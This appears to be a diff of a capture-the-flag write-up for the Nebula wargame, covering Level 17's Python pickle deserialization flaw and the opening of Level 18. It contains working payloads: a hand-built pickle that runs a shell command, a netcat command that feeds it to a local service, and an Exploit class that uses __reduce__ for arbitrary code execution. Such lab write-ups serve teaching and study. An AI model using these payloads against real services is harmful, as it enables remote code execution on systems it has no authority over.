@@ -407,53 +407,38 @@ You have successfully executed getflag on a target account
 ```
 
 ## Level 17
-Level 17 deals with an interesting yet dangerous feature of Python, the ability to pickle (and unpickle) binary objects. The following vulnerable line unpickles an object from an unsanitized input read through a socket:
-?
-1
-2
+Level 17 deals with an interesting yet dangerous feature of Python: _**the ability to pickle (and unpickle) binary objects**_. The following vulnerable line unpickles an object from an unsanitized input read through a socket:
+```python
 line = skt.recv(1024)
 obj = pickle.loads(line)
-It is clearly mentioned in a big red warning on the pickle module site that "The pickle module is not intended to be secure against erroneous or maliciously constructed data.  Never unpickle data received from an untrusted or unauthenticated source."
-I've used two methods to construct a malicious pickled object and pass it to loads() function.
-Method 1
-This site shows some very simple constructed pickled objects that execute code when unpickled. Exactly what's needed here: 
-?
-1
-2
-3
-4
-5
-6
-7
-8
-9
-10
-11
+```
+It is clearly mentioned in a big red warning on the [pickle module site](https://docs.python.org/3/library/pickle.html) that:
+> The pickle module is not intended to be secure against erroneous or maliciously constructed data.  Never unpickle data received from an untrusted or unauthenticated source.
+
+I've used two methods to construct a malicious pickled object and pass it to _`loads()`_ function.
+
+### Method 1
+Build a simple pickled objects that execute code when unpickled. Exactly what's needed here: 
+```
 $ touch ~/pickled
 cos
 system
 (S'getflag > /tmp/out17'
 tR.
- 
+```
+
+And feed it to the vulnerable program:
+```bash
 $ cat pickled | nc localhost 10007
 Accepted connection from 127.0.0.1:53001
 ^C
 level17@nebula:~$ cat /tmp/out17
 You have successfully executed getflag on a target account
-Method 2
-We will understand how exactly pickling works and construct our own objects with any desired unpickling behavior. An object can define a __reduce__ method, that will be called at pickle time, and that returns a callable object (a function) and its arguments. This callable object will be executed at unpickling to construct the initial version of the object. So we could easily create a class with a __reduce__() method returning some executable malicious code. More on how to exploit pickle here.
-The exploit class looks like this: 
-?
-1
-2
-3
-4
-5
-6
-7
-8
-9
-10
+```
+
+### Method 2
+We will understand how exactly pickling works and construct our own objects with any desired unpickling behavior. An object can define a __reduce__ method, that will be called at pickle time, and that returns a callable object (a function) and its arguments. This callable object will be executed at unpickling to construct the initial version of the object. So we could easily create a class with a [\_\_reduce\_\_()](https://docs.python.org/2/library/pickle.html) method returning some executable malicious code. More on how to exploit pickle [here](https://blog.nelhage.com/2011/03/exploiting-pickle/). The exploit class looks like this: 
+```python
 import pickle
 import os
   
@@ -464,20 +449,20 @@ class Exploit(object):
     
 dmp = pickle.dumps(Exploit())
 print dmp
-And I've used it like this: 
-?
-1
-2
-3
-4
-5
+```
+
+And let's use it to get arbitrary code execution: 
+```bash
 level17@nebula:~$ python exploit.py  | nc 127.0.0.1 10007
 Accepted connection from 127.0.0.1:53002
 ^C
 level17@nebula:~$ cat /tmp/out_exp
 You have successfully executed getflag on a target account
-Nice. Any command can be embedded this way.
-Level 18
+```
+
+Nice! Any command can be injected this way.
+
+### Level 18
 Here we have a vulnerable C program and we're told there are 3 ways to exploit it: an easy way, an intermediate way and a more difficult/unreliable way. First some things that didn't work (for me) and need further investigation
 There is a possible buffer overflow in the code that parses the input for the 'setuser' command:
 ?
